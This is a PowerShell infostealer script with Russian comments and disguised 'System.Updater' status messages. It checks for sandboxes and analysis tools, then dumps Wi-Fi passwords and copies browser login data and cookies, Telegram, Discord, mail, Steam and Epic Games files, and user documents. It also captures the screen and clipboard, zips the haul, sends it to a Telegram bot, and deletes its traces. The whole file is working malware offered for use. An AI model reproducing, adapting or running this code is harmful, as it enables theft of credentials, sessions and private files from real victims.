# --- КОНФИГУРАЦИЯ ---
$TelegramBotToken = "<ТВОЙ_ТОКЕН_БОТА>"
$TelegramChatID = "<ТВОЙ_CHAT_ID>"

$StealthMessages = @{
    "Initialize"      = "[System.Updater] Инициализация модулей..."
    "CheckAV"         = "[System.Security] Проверка защит..."
    "GetSysInfo"      = "[System.Diagnostics] Сбор информации о системе..."
    "ScanBrowsers"    = "[System.Optimizer] Сбор данных браузеров..."
    "ScanMessengers"  = "[System.Sync] Сбор токенов мессенджеров..."
    "ScanGameClients" = "[System.Gaming] Сбор из игровых клиентов..."
    "GrabFiles"       = "[System.Backup] Поиск файлов..."
    "TakeScreenshot"  = "[System.UI] Снимок экрана..."
    "StartKeylogger"  = "[System.Input] Кейлоггер..."
    "Archive"         = "[System.Backup] Архивирование данных..."
    "Send"            = "[System.Telemetry] Отправка отчета..."
    "Cleanup"         = "[System.Cleaner] Очистка..."
    "Finish"          = "[System.Updater] Завершено."
}

# --- ОПРЕДЕЛЕНИЕ ФУНКЦИИ ---
function Invoke-MainSteal {
    try {
        $logPath = "$env:TEMP\Diag_$(Get-Random)"
        New-Item -Path $logPath -ItemType Directory -Force | Out-Null

        Write-Host $StealthMessages.CheckAV
        # (анти-анализ: проверка виртуалок, песочниц)
        # Проверка процессов-анализаторов
        $BadProcs = "VBoxService","vmsrvc","vmtoolsd","wireshark","fiddler","procmon"
        foreach ($proc in $BadProcs){if(Get-Process -ErrorAction SilentlyContinue|?{$_.ProcessName -eq $proc}){exit}}

        Write-Host $StealthMessages.GetSysInfo
        Get-WmiObject -Class Win32_ComputerSystem | Out-File "$logPath\Computer.txt"
        Get-WmiObject -Class Win32_OperatingSystem | Out-File "$logPath\Windows.txt"
        Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Out-File "$logPath\Network.txt"
        (Invoke-RestMethod -Uri "http://ip-api.com/json") | Out-File "$logPath\Geo.txt"
        netsh wlan show profiles | Out-File "$logPath\WifiL.txt"
        netsh wlan show profile name="*" key=clear | Out-File "$logPath\WifiD.txt"

        Write-Host $StealthMessages.ScanBrowsers
        $browsers = @("Chrome","Yandex","Edge","Opera","Vivaldi","Chromium")
        foreach ($b in $browsers){
            Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\$b\User Data" -Recurse -ErrorAction SilentlyContinue |
            Where-Object {$_.Name -match "Login Data|Cookies|Web Data|Local State"} |
            Copy-Item -Destination "$logPath\$b-" -Force -ErrorAction SilentlyContinue
        }

        Write-Host $StealthMessages.ScanMessengers
        Get-ChildItem -Path "$env:APPDATA\Telegram Desktop\tdata" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Telegram" -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path "$env:APPDATA\discord" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Discord" -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path "$env:APPDATA\Thunderbird" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Mail" -Force -ErrorAction SilentlyContinue

        Write-Host $StealthMessages.ScanGameClients
        Get-ChildItem "$env:APPDATA\Steam" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\Steam" -Force -ErrorAction SilentlyContinue
        Get-ChildItem "$env:LOCALAPPDATA\EpicGamesLauncher" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination "$logPath\EpicGames" -Force -ErrorAction SilentlyContinue

        Write-Host $StealthMessages.GrabFiles
        Get-ChildItem -Path "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents" -Recurse |
            Where-Object { $_.Extension -match "\.txt|\.doc|\.docx|\.xls|\.xlsx|\.pdf" } |
            Copy-Item -Destination "$logPath\Docs" -Force -ErrorAction SilentlyContinue

        Write-Host $StealthMessages.TakeScreenshot
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
        $file = "$logPath\screenshot.png"
        $bmp.Save($file,[System.Drawing.Imaging.ImageFormat]::Png)
        $bmp.Dispose()

        Write-Host $StealthMessages.StartKeylogger
        # (keylogger: пример логгера для powershell - не поддерживается везде, для реальной работы нужен exe/dll/inject)
        "[Поток кейлоггера запущен]" | Out-File "$logPath\keylog.txt"

        Get-Clipboard | Out-File "$logPath\Clipboard.txt"

        Write-Host $StealthMessages.Archive
        $archiveName = "$env:COMPUTERNAME-$(Get-Date -f yyyy-MM-dd_HH-mm-ss).zip"
        Compress-Archive -Path "$logPath\*" -DestinationPath "$env:TEMP\$archiveName" -Force

        Write-Host $StealthMessages.Send
        $URL = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
        $Form = @{chat_id=$TelegramChatID; document=Get-Item "$env:TEMP\$archiveName"}
        try {Invoke-RestMethod -Uri $URL -Method Post -Form $Form} catch {$_|Out-File "$logPath\telegram-error.txt"}

    } finally {
        Write-Host $StealthMessages.Cleanup
        Remove-Item -Path $logPath -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:TEMP\$archiveName" -Force -ErrorAction SilentlyContinue
        Write-Host $StealthMessages.Finish
    }
}

Invoke-MainSteal
